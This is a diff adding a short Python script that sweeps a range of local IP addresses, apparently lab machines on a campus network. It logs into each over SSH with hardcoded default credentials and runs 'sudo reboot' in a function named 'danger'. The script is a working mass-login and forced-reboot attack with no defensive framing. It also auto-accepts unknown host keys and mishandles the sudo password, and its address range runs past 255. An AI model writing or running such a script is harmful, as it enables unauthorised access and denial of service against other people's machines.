@@ -1,0 +1,56 @@
+import paramiko
+import socket
+import time
+
+# Define SSH connection parameters
+port = 22  # Default SSH port
+username = 'iiitd'
+password = 'student'
+
+def danger(hostname):
+    # Initialize SSH client
+    ssh = paramiko.SSHClient()
+    
+    # Automatically add untrusted hosts (make sure to improve security in production)
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    try:
+        # Connect to the host with a timeout of 5 seconds
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(5)  # 5 seconds timeout
+        sock.connect((hostname, port))
+        ssh.connect(hostname, port, username, password)
+        
+        # Execute a command (example: notify-send 'hi')
+        stdin, stdout, stderr = ssh.exec_command("sudo reboot")
+        stdin, stdout, stderr = ssh.exec_command("student")
+
+        
+        # Read the output of the command
+        output = stdout.read().decode('utf-8')
+        print(output)
+        
+    except socket.timeout:
+        print(f"Connection to {hostname} timed out.")
+    except paramiko.AuthenticationException:
+        print(f"Authentication failed for {hostname}, please verify your credentials.")
+    except paramiko.SSHException as ssh_ex:
+        print(f"Unable to establish SSH connection to {hostname}: {ssh_ex}")
+    except Exception as ex:
+        print(f"Error connecting to {hostname}: {ex}")
+    finally:
+        # Close the SSH connection and socket
+        ssh.close()
+        sock.close()
+
+# Define the range of IPs to check
+start_ip = 222
+end_ip = 300
+hostname_prefix = '192.168.192.'
+
+# Iterate over the range of IPs
+for ip in range(start_ip, end_ip + 1):
+    final_ip = f"{hostname_prefix}{ip}"
+    print(f"Checking {final_ip}...")
+    danger(final_ip)
+    time.sleep(1)  # Optional: Add a delay between checks to avoid flooding the network
